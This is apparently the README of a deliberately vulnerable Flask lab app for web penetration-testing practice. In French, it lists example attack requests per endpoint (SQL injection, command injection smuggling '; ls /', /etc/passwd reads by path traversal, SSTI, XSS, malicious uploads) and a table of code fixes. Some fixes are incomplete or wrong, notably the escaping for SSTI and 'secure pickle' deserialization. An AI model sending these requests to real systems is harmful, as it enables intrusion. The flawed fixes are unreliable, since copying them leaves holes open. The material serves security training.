# Vulnerable-Flask-App

Erlik 2 - Vulnerable-Flask-App

Tested - Kali 2022.1

## Description

It is a vulnerable Flask Web App. It is a lab environment created for people who want to improve themselves in the field of web penetration testing.

## Features

It contains the following vulnerabilities.

-HTML Injection

-XSS

-SSTI

-SQL Injection

-Information Disclosure

-Command Injection

-Brute Force

-Deserialization

-Broken Authentication

-DOS

-File Upload

## Installation

git clone https://github.com/anil-yelken/Vulnerable-Flask-App

cd Vulnerable-Flask-App

sudo pip3 install -r requirements.txt

## Usage

python3 vulnerable-flask-app.py

<img src="https://github.com/anil-yelken/Vulnerable-Flask-App/blob/main/vulnerable-flask-app.jpg">

##  REST API à tester

un script Python qui définit une application Flask. Cette application semble avoir plusieurs routes, chacune gérant différentes fonctionnalités liées à une API REST. Voici un bref aperçu de certaines des routes :

/ : Renvoie "REST API" lorsqu'il est accédé.

/user/<string:name> : Récupère les informations utilisateur d'une base de données SQLite en fonction du nom d'utilisateur fourni.

/welcome/<string:name> : Renvoie un message de bienvenue avec le nom fourni.

/welcome2/<string:name> : Renvoie un message de bienvenue avec le nom fourni, mais sans utiliser jsonify.

/hello : Démontre une injection de modèle côté serveur (SSTI) en rendant un modèle avec le nom fourni.

/get_users : Exécute une commande shell pour effectuer une recherche DNS (dig) en fonction du nom d'hôte fourni.

/get_log/ : Lit le contenu du fichier restapi.log.

/read_file : Lit le contenu d'un fichier spécifié.

/deserialization/ : Démontre un exemple simple de désérialisation en utilisant le module pickle de Python.

/get_admin_mail/<string:control> : Renvoie l'adresse e-mail de l'administrateur si le paramètre de contrôle est défini sur "admin".

/run_file : Exécute une commande shell en fonction du nom de fichier fourni.

/create_file : Crée un fichier avec le nom de fichier et le contenu spécifiés.

/factorial/<int:n> : Calcule le factoriel d'un nombre. Met en œuvre un mécanisme de limitation du taux basique.

/login : Simule un mécanisme de connexion simple.

/route : Démontre la définition dynamique du type de contenu de la réponse.

/logs : Enregistre des données dans le fichier restapi.log.

/user_pass_control : Vérifie si le mot de passe inclut le nom d'utilisateur.

/upload : Gère les téléchargements de fichiers.


| Vulnérabilité | Type d'Attaque | Exemple de Requête Malveillante | Commentaire |
|---------------|-----------------|----------------------------------|-------------|
| Injection SQL dans `/user/<string:name>` | SQL Injection | `curl http://adresse_ip:8081/user/' OR 1=1; --` | Exploite une injection SQL pour contourner l'authentification. |
| Server-Side Template Injection (SSTI) | SSTI | `curl http://adresse_ip:8081/hello?name={{7*7}}` | Exploite la vulnérabilité SSTI pour évaluer une expression Python côté serveur. |
| Command Injection dans `/get_users` | Command Injection | `curl http://adresse_ip:8081/get_users?hostname=; ls /` | Exploite une injection de commande pour exécuter la commande `ls /` sur le serveur. |
| Lecture de Fichier dans `/read_file` | Lire des Fichiers | `curl http://adresse_ip:8081/read_file?filename=/etc/passwd` | Exploite une vulnérabilité de lecture de fichier pour lire le fichier `/etc/passwd`. |
| Deserialization dans `/deserialization/` | Deserialization | `curl http://adresse_ip:8081/deserialization/ -d 'pickled_data_here'` | Exploite une vulnérabilité de désérialisation en envoyant des données sérialisées malveillantes. |
| Injection de Commande dans `/run_file` | Command Injection | `curl http://adresse_ip:8081/run_file?filename=file_to_run.sh` | Exploite une injection de commande pour exécuter un fichier arbitraire sur le serveur. |
| Création de Fichier dans `/create_file` | Création de Fichier | `curl http://adresse_ip:8081/create_file?filename=malicious_file.txt&text=malicious_content` | Exploite la création de fichier pour écrire un fichier malveillant sur le serveur. |
| Lire des Logs dans `/get_log/` | Lire des Fichiers | `curl http://adresse_ip:8081/get_log/` | Exploite la vulnérabilité de lecture de fichier pour lire le fichier de logs. |
| Obtention d'email d'admin dans `/get_admin_mail/<string:control>` | Bypass de Contrôle | `curl http://adresse_ip:8081/get_admin_mail/admin` | Exploite le contournement du contrôle pour obtenir l'email de l'admin. |
| Limite de Requête dans `/factorial/<int:n>` | Attaque par Déni de Service | `curl http://adresse_ip:8081/factorial/1000000` | Exploite la limitation de requête pour effectuer une attaque par déni de service. |
| Injection de Formulaire dans `/login` | Injection de Formulaire | `curl -X GET "http://adresse_ip:8081/login?username=malicious&password=' OR '1'='1"` | Exploite une injection dans le formulaire de login. |
| Upload de Fichier Malveillant dans `/upload` | Téléchargement de Fichier Malveillant | `curl -X POST -F "file=@malicious_file.php" http://adresse_ip:8081/upload` | Exploite une mauvaise validation de fichiers pour télécharger un fichier malveillant. |
| Traversée de Répertoire dans `/read_file` | Traversée de Répertoire | `curl http://adresse_ip:8081/read_file?filename=../../etc/passwd` | Exploite une vulnérabilité de traversée de répertoire pour lire le fichier `/etc/passwd`. |
| Énumération d'Utilisateurs dans `/get_users` | Énumération d'Utilisateurs | `curl http://adresse_ip:8081/get_users?hostname=google.com; ls /home` | Exploite une vulnérabilité pour récupérer des informations sensibles sur les utilisateurs. |
| Énumération de Fichiers dans `/get_log/` | Énumération de Fichiers | `curl http://adresse_ip:8081/get_log/../../../etc/` | Exploite une vulnérabilité pour récupérer des informations sensibles sur le système. |
| Modification de Logs dans `/logs` | Modification de Logs | `curl http://adresse_ip:8081/logs?data=malicious_log_entry` | Exploite une vulnérabilité pour injecter des entrées malveillantes dans les logs. |
| Attaque par Force Brute dans `/login` | Attaque par Force Brute | `curl -X GET "http://adresse_ip:8081/login?username=admin&password=bruteforce123"` | Exploite la faiblesse d'un mécanisme de login en tentant différentes combinaisons. |
| Interception de Session dans `/login` | Interception de Session | `curl -X GET "http://adresse_ip:8081/login?username=admin&password=malicious&cookie=attacker_cookie"` | Exploite une vulnérabilité pour intercepter la session utilisateur. |
| Spoofing d'Adresse IP dans `/factorial/<int:n>` | Spoofing d'Adresse IP | `curl --header "X-Forwarded-For: attacker_ip" http://adresse_ip:8081/factorial/5` | Exploite une vulnérabilité pour simuler une adresse IP falsifiée. |
| Contournement d'Authentification dans `/get_admin_mail/<string:control>` | Contournement d'Authentification | `curl http://adresse_ip:8081/get_admin_mail/protected` | Exploite une faiblesse dans le contrôle d'authentification pour accéder à des données protégées. |
| HTML Injection dans `/welcome2/<string:name>` | HTML Injection | `curl http://adresse_ip:8081/welcome2?name=<script>alert('XSS');</script>` | Exploite une injection HTML pour exécuter du code JavaScript côté client. |
| XSS dans `/hello` | Cross-Site Scripting (XSS) | `curl http://adresse_ip:8081/hello?name=<script>alert('XSS');</script>` | Exploite une vulnérabilité XSS pour exécuter du code JavaScript côté client. |
| Information Disclosure dans `/get_users` | Divulgation d'Informations | `curl http://adresse_ip:8081/get_users?hostname=nonexistent_user` | Exploite une vulnérabilité qui divulgue des informations sensibles sur le système. |
| Brute Force dans `/login` | Brute Force | `curl -X GET "http://adresse_ip:8081/login?username=admin&password=bruteforce123"` | Exploite la faiblesse d'un mécanisme de login en tentant différentes combinaisons. |
| DOS dans `/factorial/<int:n>` | Attaque par Déni de Service | `curl http://adresse_ip:8081/factorial/1000000` | Exploite la limitation de requête pour effectuer une attaque par déni de service. |
| Upload de Fichier dans `/upload` | Téléchargement de Fichier Malveillant | `curl -X POST -F "file=@malicious_file.php" http://adresse_ip:8081/upload` | Exploite une mauvaise validation de fichiers pour télécharger un fichier malveillant. |

##  Corrections de Sécurité dans le Code

**Voir le code dans**: best-flask-appSafe.py


Le tableau suivant résume les corrections apportées au code pour atténuer les vulnérabilités de sécurité, les attaques associées, et les commentaires et recommandations correspondants.

| Attaque / Vulnérabilité   | URL/Endpoint       | Code Avant Correction                                       | Code Après Correction                                       | Commentaires et Recommandations                               |
|----------------------------|---------------------|-------------------------------------------------------------|-------------------------------------------------------------|----------------------------------------------------------------|
| Injection SQL              | `/user/<string:name>` | `cur.execute("select * from test where username = '%s'" % name)` | `cur.execute("select * from test where username = ?", (name,))` | Utilise des requêtes paramétrées pour prévenir l'injection SQL. |
| SSTI                       | `/hello`             | `render_template_string(template)`                           | `render_template_string(escape(template))`                 | Échappe les données avant de les rendre pour éviter SSTI.      |
| XSS                        | `/hello`             | `return render_template_string(template)`                    | `return render_template_string(escape(template))`           | Échappe les données pour prévenir l'injection de script.       |
| Command Injection          | `/get_users`         | `subprocess.check_output(command, shell=True)`               | `subprocess.check_output(command)`                          | Utilise une liste d'arguments pour prévenir l'injection de commande. |
| Traversée de Répertoire    | `/read_file`         | `file = open(filename, "r")`                                  | `filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)`<br>`file = open(filepath, "r")` | Vérifie le chemin du fichier pour prévenir la traversée de répertoire. |
| Brute Force                | `/login`             | `if "anil" in username and "cyber" in passwd:`               | Utilise un mécanisme de verrouillage pour éviter les attaques par force brute. |
| Téléchargement Malveillant | `/upload`            | `file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))` | Vérifie le type de fichier pour éviter les téléchargements malveillants. |
| HTML Injection             | `/welcome2`          | `data = "Welcome " + name`                                    | `data = "Welcome " + escape(name)`                         | Échappe les données pour prévenir l'injection HTML.            |
| Deserialization Malveillante | `/deserialization/`  | `data = pickle.loads(received_data)`                          | Utilise la désérialisation sécurisée avec pickle.           |
| Spoofing d'Adresse IP      | `/factorial/<int:n>` | `curl --header "X-Forwarded-For: attacker_ip" http://adresse_ip:8081/factorial/5` | Utilise des moyens appropriés pour détecter l'adresse IP réelle. |
| Contournement d'Authentification | `/get_admin_mail/<string:control>` | `if control=="admin":` | Utilise un mécanisme d'authentification sécurisé plutôt qu'une simple comparaison. |
| Limite de Requête           | `/factorial/<int:n>` | `if connection[request.remote_addr] > 2:`                    | Utilise un mécanisme de verrouillage pour éviter les attaques par déni de service. |
| Énumération d'Utilisateurs  | `/get_users`         | `curl http://adresse_ip:8081/get_users?hostname=google.com; ls /home` | Vérifie si l'utilisateur a le droit de récupérer ces informations. |
| Énumération de Fichiers     | `/get_log/`          | `curl http://adresse_ip:8081/get_log/../../../etc/`          | Vérifie si l'utilisateur a le droit de récupérer ces informations. |
| Modification de Logs        | `/logs`              | `curl http://adresse_ip:8081/logs?data=malicious_log_entry`  | Valide et filtre les données avant de les insérer dans les logs. |
| Interception de Session     | `/login`             | `curl -X GET "http://adresse_ip:8081/login?username=admin&password=malicious&cookie=attacker_cookie"` | Assurez-vous que les cookies de session sont sécurisés et ne peuvent pas être interceptés. |
| Information Disclosure      | `/get_users`         | `curl http://adresse_ip:8081/get_users?hostname=nonexistent_user` | Gérez les erreurs de manière appropriée plutôt que de divulguer des informations sensibles. |
| DOS (Attaque par Déni de Service) | `/factorial/<int:n>` | `curl http://adresse_ip:8081/factorial/1000000` | Limitez les opérations intensives en ressources pour éviter le déni de service. |
| Injection de Formulaire     | `/login`             | `curl -X GET "http://adresse_ip:8081/login?username=malicious&password=' OR '1'='1"` | Validez et échappez les données du formulaire avant de les utiliser. |
| Énumération de Fichiers     | `/get_log/`          | `curl http://adresse_ip:8081/get_log/../../../etc/`          | Gérez les accès aux fichiers de manière stricte et contrôlée. |
| Énumération d'Utilisateurs  | `/get_users`         | `curl http://adresse_ip:8081/get_users?hostname=google.com; ls /home` | Gérez les accès aux informations d'utilisateur de manière stricte. |
